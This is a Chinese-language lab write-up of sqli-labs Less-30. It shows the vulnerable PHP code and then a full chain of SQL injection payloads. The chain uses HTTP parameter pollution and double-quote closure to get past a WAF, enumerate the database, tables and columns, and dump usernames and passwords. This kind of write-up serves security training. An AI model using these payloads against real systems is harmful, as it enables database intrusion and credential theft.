# Less-30 （HPP + 双引号包裹）

## 查看分析源码

和 Less-29 的 HPP 结构一样，但多了双引号包裹，没了报错：

```php
$qs = $_SERVER['QUERY_STRING'];
$id1 = java_implimentation($qs);             // 取第一个 id → WAF 检查
whitelist($id1);

$id = $_GET['id'];                           // PHP 取最后一个 id
$id = '"' .$id. '"';                         // ★ 双引号裹上

$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
// print_r(mysql_error());                    // 没报错
```

输出逻辑：数据正常时 username/password 正常显示，失败时啥都不显示，不是盲注，只是没报错而已。

## 原理

```
?id=1&id=-1" union select 1,2,3--+
    ↑                ↑
  WAF看第一个       PHP用最后一个
```

双引号闭合，所以 payload 里用双引号：

```
id="-1" union select 1,2,3--+"
```

## order by

```
?id=1&id=1" order by 3--+
?id=1&id=1" order by 4--+
```

## 回显位

```
?id=1&id=-1" union select 1,2,3--+
```

## 爆库名

```
?id=1&id=-1" union select 1,database(),3--+
```

## 爆表名

```
?id=1&id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

## 爆列名

```
?id=1&id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
```

## 爆数据

```
?id=1&id=-1" union select 1,group_concat(username,0x3a,password),3 from users--+
```
![](99_Attachments/图片/Less-30/file-20260615202353509.png)

总结：Less-30 = Less-29 的结构 + 双引号闭合 + 无报错。不是盲注——数据正常时一样显示结果。有报错没报错只影响你调试时看不看得到错误信息，不影响注入拿数据。
